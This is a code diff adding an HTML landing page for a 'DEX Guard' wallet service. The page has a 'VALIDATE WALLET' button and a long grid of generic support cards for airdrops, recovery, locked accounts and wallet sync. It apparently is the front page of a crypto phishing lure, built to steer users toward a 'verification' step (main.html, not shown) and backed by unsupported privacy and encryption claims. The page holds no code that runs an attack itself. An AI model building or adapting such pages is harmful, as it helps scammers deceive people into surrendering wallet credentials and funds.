@@ -1,0 +1,1456 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport"
+      content="width=device-width,
+               initial-scale=1.0,
+               maximum-scale=1.0">
+
+<title>DEX GUARD</title>
+
+
+<style>
+
+/* =====================================================
+   RESET
+===================================================== */
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+
+html {
+    scroll-behavior: smooth;
+}
+
+
+body {
+
+    width: 100%;
+
+    min-height: 100vh;
+
+    overflow-x: hidden;
+
+    font-family:
+        Arial,
+        Helvetica,
+        sans-serif;
+
+    color: white;
+
+    background: #080909;
+}
+
+
+/* =====================================================
+   COLORS
+===================================================== */
+
+:root {
+
+    --blue: #64ddff;
+
+    --blue-light: #a5efff;
+
+    --blue-dark: #18bfe7;
+
+    --background: #090a0b;
+
+    --card: #111213;
+
+    --text-gray: #888d90;
+
+}
+
+
+/* =====================================================
+   DARK BACKGROUND IMAGE
+===================================================== */
+
+body::before {
+
+    content: "";
+
+    position: fixed;
+
+    inset: 0;
+
+    z-index: -5;
+
+    background:
+
+        linear-gradient(
+            rgba(3, 5, 6, 0.92),
+            rgba(3, 5, 6, 0.96)
+        ),
+
+        url("graph-image.jpg");
+
+    background-size: cover;
+
+    background-position: center;
+
+    background-repeat: no-repeat;
+
+    filter: brightness(0.42);
+
+}
+
+
+/* =====================================================
+   HEADER
+===================================================== */
+
+.header {
+
+    width: 100%;
+
+    height: 52px;
+
+    display: flex;
+
+    align-items: center;
+
+    padding-left: 14px;
+
+    background:
+        rgba(4, 5, 6, 0.96);
+
+    border-bottom:
+        1px solid
+        rgba(255,255,255,0.04);
+
+}
+
+
+.logo {
+
+    width:170px;
+
+    height: auto;
+
+    display: block;
+}
+
+
+/* =====================================================
+   HERO
+===================================================== */
+
+.hero {
+
+    width: 100%;
+
+    min-height: 510px;
+
+    position: relative;
+
+    display: flex;
+
+    align-items: center;
+
+    justify-content: center;
+
+    text-align: center;
+
+    padding:
+        80px 22px
+        50px;
+
+}
+
+
+.hero-content {
+
+    width: 100%;
+
+    max-width: 380px;
+
+    position: relative;
+
+    z-index: 2;
+}
+
+
+.hero h1 {
+
+    font-size: 22px;
+
+    font-weight: 800;
+
+    letter-spacing: 1px;
+
+    margin-bottom: 20px;
+
+    line-height: 1.3;
+
+}
+
+
+.hero h1 span {
+
+    color: var(--blue);
+
+    text-shadow:
+        0 0 12px
+        rgba(100,221,255,0.35);
+
+    display: block;
+}
+
+
+.hero p {
+
+    color: #919699;
+
+    font-size: 11px;
+
+    font-weight: 700;
+
+    line-height: 1.6;
+
+    text-transform: uppercase;
+
+    margin-bottom: 12px;
+}
+
+
+/* =====================================================
+   CONNECT WALLET BUTTON
+===================================================== */
+
+.connect-button {
+
+    display: flex;
+
+    align-items: center;
+
+    justify-content: center;
+
+    width: 145px;
+
+    height: 40px;
+
+    margin:
+        25px auto
+        0;
+
+    background:
+        var(--blue);
+
+    color: #041116;
+
+    text-decoration: none;
+
+    font-size: 8px;
+
+    font-weight: 900;
+
+    letter-spacing: 0.5px;
+
+    border-radius: 6px;
+
+    box-shadow:
+
+        0 0 8px
+        rgba(100,221,255,0.8),
+
+        0 0 22px
+        rgba(100,221,255,0.25);
+
+    transition: 0.2s;
+}
+
+
+.connect-button:active {
+
+    transform:
+        scale(0.94);
+
+    background:
+        var(--blue-light);
+}
+
+
+/* =====================================================
+   DECORATIVE FLOATING OBJECTS
+===================================================== */
+
+.coin {
+
+    position: absolute;
+
+    border-radius: 50%;
+
+    background:
+
+        radial-gradient(
+            circle at 35% 30%,
+            #d5f9ff,
+            #5eddfc 40%,
+            #08758e 100%
+        );
+
+    border:
+        1px solid
+        rgba(150,238,255,0.65);
+
+    box-shadow:
+
+        0 0 14px
+        rgba(100,221,255,0.35),
+
+        inset 0 0 8px
+        rgba(255,255,255,0.25);
+
+    opacity: 0.65;
+
+    animation:
+        floating 5s ease-in-out infinite;
+}
+
+
+.coin::after {
+
+    content: "◈";
+
+    position: absolute;
+
+    top: 50%;
+
+    left: 50%;
+
+    transform:
+        translate(-50%, -50%);
+
+    color: #064254;
+
+    font-size: 21px;
+}
+
+
+.coin-one {
+
+    width: 58px;
+
+    height: 58px;
+
+    top: 45px;
+
+    left: 37%;
+}
+
+
+.coin-two {
+
+    width: 55px;
+
+    height: 55px;
+
+    right: 7%;
+
+    top: 285px;
+
+    animation-delay: 1s;
+}
+
+
+.coin-three {
+
+    width: 50px;
+
+    height: 50px;
+
+    left: 10%;
+
+    bottom: 15px;
+
+    animation-delay: 2s;
+}
+
+
+@keyframes floating {
+
+    0% {
+        transform:
+            translateY(0)
+            rotate(0deg);
+    }
+
+    50% {
+        transform:
+            translateY(-14px)
+            rotate(8deg);
+    }
+
+    100% {
+        transform:
+            translateY(0)
+            rotate(0deg);
+    }
+
+}
+
+
+/* =====================================================
+   GET STARTED
+===================================================== */
+
+.get-started {
+
+    width: 100%;
+
+    padding:
+        20px 0
+        65px;
+}
+
+
+.section-title {
+
+    text-align: center;
+
+    font-size: 9px;
+
+    font-weight: 800;
+
+    letter-spacing: 1px;
+
+    margin-bottom: 32px;
+}
+
+
+.section-title::after {
+
+    content: "";
+
+    display: block;
+
+    width: 35px;
+
+    height: 1px;
+
+    margin:
+        9px auto
+        0;
+
+    background:
+        var(--blue);
+
+    box-shadow:
+        0 0 8px
+        var(--blue);
+}
+
+
+/* =====================================================
+   MOBILE CARD CONTAINER
+===================================================== */
+
+.cards {
+
+    width: 100%;
+
+    display: flex;
+
+    flex-direction: column;
+
+    align-items: center;
+
+    gap: 34px;
+}
+
+
+/* =====================================================
+   CARD
+===================================================== */
+
+.card {
+
+    width: calc(100% - 44px);
+
+    max-width: 390px;
+
+    min-height: 165px;
+
+    padding:
+        25px 20px
+        20px;
+
+    background:
+
+        linear-gradient(
+            145deg,
+            rgba(24,25,26,0.98),
+            rgba(10,11,12,0.98)
+        );
+
+    border:
+        1px solid
+        rgba(100,221,255,0.70);
+
+    border-radius: 14px;
+
+    display: flex;
+
+    flex-direction: column;
+
+    align-items: center;
+
+    text-align: center;
+
+    box-shadow:
+
+        0 0 8px
+        rgba(100,221,255,0.20),
+
+        0 0 22px
+        rgba(100,221,255,0.12),
+
+        inset 0 0 18px
+        rgba(100,221,255,0.025);
+
+    transition:
+        transform 0.2s,
+        box-shadow 0.2s;
+}
+
+
+.card:active {
+
+    transform:
+        scale(0.98);
+
+    box-shadow:
+
+        0 0 15px
+        rgba(100,221,255,0.45);
+}
+
+
+/* =====================================================
+   CARD TITLE
+===================================================== */
+
+.card h2 {
+
+    color: #ffffff;
+
+    font-size: 15px;
+
+    font-weight: 400;
+
+    line-height: 1.3;
+
+    margin-bottom: 12px;
+
+    text-transform: uppercase;
+}
+
+
+/* =====================================================
+   CARD DESCRIPTION
+===================================================== */
+
+.card p {
+
+    width: 100%;
+
+    color: #888d90;
+
+    font-size: 11px;
+
+    line-height: 1.65;
+
+    margin-bottom: 17px;
+}
+
+
+/* =====================================================
+   CARD BUTTON
+===================================================== */
+
+.proceed {
+
+    width: 112px;
+
+    height: 36px;
+
+    display: flex;
+
+    align-items: center;
+
+    justify-content: center;
+
+    border-radius: 7px;
+
+    background:
+        var(--blue);
+
+    color: #031116;
+
+    text-decoration: none;
+
+    font-size: 9px;
+
+    font-weight: 900;
+
+    letter-spacing: 0.6px;
+
+    box-shadow:
+
+        0 0 8px
+        rgba(100,221,255,0.8),
+
+        0 0 18px
+        rgba(100,221,255,0.25);
+
+    transition: 0.2s;
+}
+
+
+.proceed:active {
+
+    transform:
+        scale(0.93);
+
+    background:
+        var(--blue-light);
+}
+
+
+/* =====================================================
+   FOOTER
+===================================================== */
+
+.footer {
+
+    width: 100%;
+
+    background:
+        #1a1a1a;
+
+    padding:
+        43px 20px
+        35px;
+
+    border-top:
+        1px solid
+        rgba(255,255,255,0.03);
+}
+
+
+.footer-inner {
+
+    width: 100%;
+
+    max-width: 390px;
+
+    margin: auto;
+}
+
+
+/* =====================================================
+   FOOTER LOGO
+===================================================== */
+
+.footer-logo {
+
+    width: 150px;
+
+    height: auto;
+
+    display: block;
+
+    margin-bottom: 28px;
+}
+
+
+/* =====================================================
+   FOOTER DIVIDER
+===================================================== */
+
+.footer-divider {
+
+    width: 100%;
+
+    height: 1px;
+
+    background:
+        rgba(255,255,255,0.08);
+
+    margin-bottom: 30px;
+}
+
+
+/* =====================================================
+   PRIVACY TITLE
+===================================================== */
+
+.footer h2 {
+
+    color: #ffffff;
+
+    font-size: 16px;
+
+    font-weight: 400;
+
+    margin-bottom: 12px;
+}
+
+
+/* =====================================================
+   PRIVACY TEXT
+===================================================== */
+
+.footer p {
+
+    color: #85898b;
+
+    font-size: 11px;
+
+    line-height: 1.65;
+
+    margin-bottom: 17px;
+}
+
+
+/* =====================================================
+   THANK YOU
+===================================================== */
+
+.thank-you {
+
+    margin-top: 8px;
+
+    color: #9a9d9f !important;
+}
+
+
+/* =====================================================
+   COPYRIGHT
+===================================================== */
+
+.copyright {
+
+    margin-top: 55px;
+
+    margin-bottom: 0 !important;
+
+    color: #888b8d !important;
+
+    font-size: 10px !important;
+}
+
+
+.copyright span {
+
+    color:
+        var(--blue);
+}
+
+
+/* =====================================================
+   TABLET / DESKTOP
+===================================================== */
+
+@media (min-width: 700px) {
+
+    .hero {
+
+        min-height: 600px;
+    }
+
+
+    .hero h1 {
+
+        font-size: 28px;
+    }
+
+
+    .hero p {
+
+        font-size: 12px;
+    }
+
+
+    .cards {
+
+        display: grid;
+
+        grid-template-columns: repeat(3, 1fr);
+
+        gap: 24px;
+
+        max-width: 1200px;
+
+        margin: 0 auto;
+
+        padding: 0 20px;
+    }
+
+
+    .card {
+
+        width: 100%;
+
+        max-width: none;
+
+        min-height: 180px;
+    }
+
+
+    .footer-inner {
+
+        max-width: 1200px;
+    }
+
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+
+<header class="header">
+
+    <a href="index.html">
+
+        <img
+            src="1787770720214.png"
+            alt="DEX GUARD"
+            class="logo"
+        >
+
+    </a>
+
+</header>
+
+
+
+<section class="hero">
+
+
+    <div class="coin coin-one"></div>
+
+    <div class="coin coin-two"></div>
+
+    <div class="coin coin-three"></div>
+
+
+    <div class="hero-content">
+
+
+        <h1>
+            WELCOME TO
+            <span>DEX GUARD</span>
+        </h1>
+
+
+        <p>
+            DEX Guard welcomes you to a world where innovation
+            has no limits. Discover the boundless opportunities of
+            decentralized applications and embrace a new era of
+            digital empowerment. Step into a space where
+            creativity soars, ideas thrive, and the future is yours to
+            shape. Join us on this transformative journey to unlock
+            the full potential of decentralized technology.
+            Welcome to DEX Guard, the starting point for the next
+            wave of innovation.
+        </p>
+
+
+        <a
+            href="main.html"
+            class="connect-button"
+        >
+            VALIDATE WALLET
+        </a>
+
+
+    </div>
+
+</section>
+
+
+
+<section class="get-started">
+
+
+    <h2 class="section-title">
+        GET STARTED BELOW.
+    </h2>
+
+
+    <div class="cards">
+
+
+        <div class="card">
+
+            <h2>HESITATION</h2>
+
+            <p>
+                Click here if you are unsure what
+                option to select or need assistance.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>NOTIFICATION</h2>
+
+            <p>
+                Click here to review important
+                wallet notifications.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>CLAIM</h2>
+
+            <p>
+                Click here to review available
+                claims and related information.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>SWAP</h2>
+
+            <p>
+                Click here for swap issues or
+                problems with token exchanges.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>AIRDROP</h2>
+
+            <p>
+                Click here for airdrop related
+                questions and assistance.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>NFTS</h2>
+
+            <p>
+                Click here for NFT related issues
+                or wallet assistance.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>LOCKED ACCOUNT</h2>
+
+            <p>
+                Click here if you are having
+                problems accessing your account.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>LOGIN ERROR</h2>
+
+            <p>
+                Click here for login problems
+                or account access issues.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>WALLET GLITCH</h2>
+
+            <p>
+                Click here for wallet problems
+                or unexpected wallet behavior.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>DECLINING</h2>
+
+            <p>
+                Click here if your transaction
+                keeps getting declined.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>VALIDATION</h2>
+
+            <p>
+                Click here for wallet validation
+                and verification issues.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>TRANSACTION DELAY</h2>
+
+            <p>
+                Click here if your transaction
+                has been delayed.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>INSUFFICIENT BALANCE</h2>
+
+            <p>
+                Click here if your wallet balance
+                appears incorrect or incomplete.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>RECOVERY</h2>
+
+            <p>
+                Click here for account or wallet
+                recovery assistance.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>BUY TOKEN</h2>
+
+            <p>
+                Click here for problems purchasing
+                or receiving tokens.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>PURCHASE</h2>
+
+            <p>
+                Click here for purchase related
+                problems or questions.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>BALANCE</h2>
+
+            <p>
+                Click here for wallet balance
+                related issues.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>TWO-FACTOR AUTHENTICATION</h2>
+
+            <p>
+                Click here for authentication
+                and security problems.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>SECURITY ISSUE</h2>
+
+            <p>
+                Click here to review wallet
+                security related issues.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>FUNDS</h2>
+
+            <p>
+                Click here for missing or
+                inaccessible funds.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>MACHINE FOUND</h2>
+
+            <p>
+                Click here to review detected
+                activity and related information.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>FAILED TRANSACTION</h2>
+
+            <p>
+                Click here for failed transaction
+                issues or assistance.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>DEPOSIT</h2>
+
+            <p>
+                Click here for deposit issues or
+                to report missing or delayed funds.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>WALLET SYNC</h2>
+
+            <p>
+                Click here to sync your wallet or
+                resolve wallet sync issues.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+        <div class="card">
+
+            <h2>WITHDRAWAL</h2>
+
+            <p>
+                Click here for withdrawal issues or
+                support with missing withdrawals.
+            </p>
+
+            <a
+                href="index.html"
+                class="proceed"
+            >
+                PROCEED →
+            </a>
+
+        </div>
+
+
+    </div>
+
+</section>
+
+
+
+<footer class="footer">
+
+
+    <div class="footer-inner">
+
+
+        <img
+            src="1787770720214.png"
+            alt="DEX GUARD"
+            class="footer-logo"
+        >
+
+
+        <div class="footer-divider"></div>
+
+
+        <h2>
+            Your Privacy &amp; Security
+        </h2>
+
+
+        <p>
+            We take your privacy and data security
+            seriously. All information submitted
+            through our verification process is
+            protected using end-to-end encryption,
+            ensuring that your data remains secure
+            while being transmitted and stored.
+        </p>
+
+
+        <p>
+            Your sensitive information is processed
+            through secure, automated systems with
+            no unnecessary human access or manual
+            interference during transmission. We
+            implement industry-standard security
+            measures to safeguard your personal data
+            against unauthorized access, alteration,
+            disclosure, or misuse.
+        </p>
+
+
+        <p>
+            Your information is used solely for
+            verification and validation purposes and
+            handled in accordance with our privacy
+            and security policies. We are committed
+            to maintaining the highest standards of
+            confidentiality and protecting your trust
+            every step of the way.
+        </p>
+
+
+        <p class="thank-you">
+            Thank you
+        </p>
+
+
+        <p class="copyright">
+
+            © 2023
+            <span>DEX Guard</span>.
+            All rights reserved.
+
+        </p>
+
+
+    </div>
+
+
+</footer>
+
+
+</body>
+
+</html>
